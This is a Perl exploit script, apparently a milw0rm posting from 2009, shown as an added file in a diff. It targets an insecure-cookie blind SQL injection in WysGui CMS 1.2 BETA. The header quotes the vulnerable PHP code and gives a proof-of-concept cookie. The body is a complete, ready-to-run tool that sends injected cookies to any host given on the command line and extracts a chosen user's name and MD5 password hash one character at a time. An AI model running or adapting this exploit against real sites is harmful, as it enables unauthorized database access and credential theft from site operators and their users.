@@ -1,0 +1,296 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       	   	 (Insecure cookie handling) BLIND SQL INJECTION		              |
+#|--------------------------------------------------------------------------------------------|
+#|                         	    | WysGui CMS 1.2 BETA |		 	              |
+#|  CMS INFORMATION:		     ---------------------				      |
+#|										              |
+#|-->WEB: http://wysgui.com/					   		              |
+#|-->DOWNLOAD: http://sourceforge.net/projects/wysgui/		   		              |
+#|-->DEMO: http://wysgui.com/demo/							      |
+#|-->CATEGORY: CMS / Portals								      |
+#|-->DESCRIPTION: WysGui comes from two technical words: WYSIWYG and GUI.WYSIWYG,             |
+#| 		(pronounced, Wizzy-Wig),tands for What You See Is What You Get...	      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3                                				      |
+#|-->DORK: N/A										      |
+#|-->CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
+#|-->AFFECT VERSION: LAST = 1.2 BETA (Maybe <= ?)					      |
+#|-->Discovered Bug date: 2009-04-20							      |
+#|-->Reported Bug date: 2009-04-20							      |
+#|-->Fixed bug date: Not fixed								      |
+#|-->Info patch (????): Not fixed							      |   
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunailla, padres (y amigos xD) por su apoyo.      |
+#----------------------------------------------------------------------------------------------
+#
+#-----------
+#BUG FILE:
+#-----------
+#
+#Path --> [HOME_PATH]/modules/body_mods/admin_panel/settings.php
+#
+#It contents(¿?...LooooL)
+#
+#<?php
+#//loading data for site tree.
+#if(strlen($_COOKIE['admin_pages']))
+#{
+#	$admin_pages = explode(',',$_COOKIE['admin_pages']);	<--------VULN--------|
+#}
+#else
+#{
+#	$admin_pages = array(
+#			'addPage', 
+#			'Edit Page', 
+#			'Delete Page', 
+#			  ...);
+#}
+#?>
+#
+#Then...
+#
+#Path --> [HOME_PATH]/modules/body_mods/admin_panel/settings.php
+#
+#It contents:
+#				...
+#				
+#				if( $i>1 ){
+#					$order.= ' `page` = "'.$admin_pages[$i].'",';	
+#				}
+#				...			
+#
+#				$allPages_select = 'SELECT * FROM `pagedata` 
+#				WHERE '.$where.'								<--------VULN--------|
+#				ORDER BY  '.$order;
+#				$allPages_query = mysql_query($allPages_select) or die($allPages_select);
+#				while($allPages_row = mysql_fetch_array($allPages_query))
+#				{...}
+#------------
+#CONDITIONS:
+#------------
+#
+#**gpc_magic_quotes=off
+#
+#---------------------------------------
+#PROOF OF CONCEPT (BLIND SQL INJECTION):
+#---------------------------------------
+#
+#COOKIE --> admin_pages=about" AND 1=1 /*
+#
+#Return: about.php
+#
+#*******************************************************************
+# ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+#*******************************************************************
+#-------------------------------------------------------------------
+#*******************************************************************
+# GREETZ TO: JosS and all SPANISH Hack3Rs community!
+#*******************************************************************
+#
+#-------------------EOF---------------------------------->>>ENJOY IT!
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title WysGui CMS 1.2 BETA (Insecure Cookie Handling) BLIND SQL Injection Exploit");
+		system ("color 02");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	my $request = HTTP::Request -> new(GET => $_[1]);
+	$request->header(cookie => $_[0]);
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub helper {
+	print "\n\t[XxX] WysGui CMS 1.2 BETA - BLIND SQL Injection Exploit\n";
+	print "\t[XxX] USAGE MODE: [XxX]\n";
+	print "\t[XxX] perl $0 [HOST] [PATH] [id]\n";
+	print "\t[XxX] [HOST]: Web.\n";
+	print "\t[XxX] [PATH]: Home Path.\n";
+	print "\t[XxX] [id]: Id user. Default: 1 (**optional)\n";
+	print "\t[XxX] Example: perl $0 'www.example.es' 'wysgui_1.2' '1'\n"; 
+}
+sub lengthuser{
+#First, user length...
+$exit=0;
+$i=0;
+while($exit==0){
+my $insec_cookie='admin_pages=about" AND (SELECT length(user) from users WHERE ID='.$_[1].')='.$i++.' /*';
+$output=&request($insec_cookie,$_[0]);
+if ( $output =~ (/about.ico/))
+{
+$exit=1;
+}
+}
+
+#Save column length
+$lengthuser=$i-1;
+print "\t-----------------------------------------------------------------\n";
+print "\tUser Length catched!\n";
+print "\tUser Length: ".$lengthuser."\n";
+print "\tBruteforcing values...\n";
+print "\t-----------------------------------------------------------------\n";
+return $lengthuser;
+}
+sub bruteforcing {
+#Getting datas
+$j=1;
+	$i=48;
+	while(($j<=$_[2]) && ($i<=126)){
+		my $insec_cookie='admin_pages=about" AND ascii(substring((SELECT '.$_[3].' FROM users WHERE ID='.$_[1].') FROM '.$j.' FOR 1))='.$i.' /*';
+		$output=&request($insec_cookie,$_[0]);
+		if ( $output =~ (/about.ico/))
+		{
+			$values=$values.chr($i);
+			$j++;
+			$i=47;
+		}
+	if($i==57)
+	{
+		$i=96;
+	}
+#new char
+	$i++; 
+	}
+#Error
+	if(($i>127) || ($j>$_[2])){
+		if(!$values){
+			print "\t-----------------------------------------------------------------\n";
+			print "\tEXPLOIT FAILED!\n";
+			print "\tFatal error: Datas doesn't find!\n";
+			print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
+			print "\t-----------------------------------------------------------------\n";
+			exit(1);
+		}
+	}
+	
+return $values;
+}
+#Main
+&lw;
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t##  WysGui CMS 1.2 BETA - BLIND SQL Injection Exploit  ##\n\n";
+	print "\t\t##         ++Conditions: Need magic_quotes=off         ##\n\n";
+	print "\t\t##                    Author: Y3nh4ck3r                ##\n\n";
+	print "\t\t##            Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n";
+	print "\t\t##                    Proud to be Spanish!             ##\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+#Init variables
+	my $host=$ARGV[0];
+	my $path=$ARGV[1];
+#Build the uri
+	my $finalhost="http://".$host."/".$path."/admin.php";
+#Check all variables needed
+$numArgs = $#ARGV + 1;
+	if($numArgs<=1) 
+	{
+		&helper;
+		exit(1);	
+	}
+#Id-user is optional.Default:1
+	if(!$ARGV[2]){
+		$idhacked="1";	
+	}else{
+		$idhacked=$ARGV[2];	
+	}
+#Testing blind sql injection
+my $finalrequest = $finalhost;	
+#Test blind sql injection
+my $insec_cookie='admin_pages=about" AND 1=1 /*'; #injected cookie
+$output=&request($insec_cookie,$finalrequest);
+if ( $output =~ (/about.ico/))
+{    
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWeb is vulnerable!\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tChecking id user...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}else{ 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tThis Web is not vulnerable!\n";
+	print "\tMaybe patched or gpc_magic_quotes=off\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+exit(1); 
+}	
+#Test if user exists
+my $insec_cookie='admin_pages=about" AND (SELECT COUNT(*) from users WHERE ID='.$idhacked.') /*'; #injected cookie
+$output=&request($insec_cookie,$finalrequest);
+if ( $output =~ (/about.ico/))
+{    
+	print "\t-----------------------------------------------------------------\n";
+	print "\tOK...The user exists!\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWait several minutes...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}else{ 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tUser doesn't exists!\n";		
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+exit(1); }	
+#Bruteforcing user...
+$length_user=&lengthuser($finalrequest,$idhacked);
+$user=&bruteforcing($finalrequest,$idhacked,$length_user,'user');
+print "\t-----------------------------------------------------------------\n";
+print "\tGot user!\n";
+print "\tBruteforcing password hash (md5)...\n";
+print "\t-----------------------------------------------------------------\n";
+$passhash=&bruteforcing($finalrequest,$idhacked,32,'pass'); #it isn't needed length
+print "\n\t\t*************************************************\n";
+print "\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n";
+print "\t\t*************************************************\n\n";
+print "\t\tUser-id:".$idhacked."\n";
+print "\t\tUser:".$user."\n";
+print "\t\tUser-password(hash):".$passhash."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-04-20]
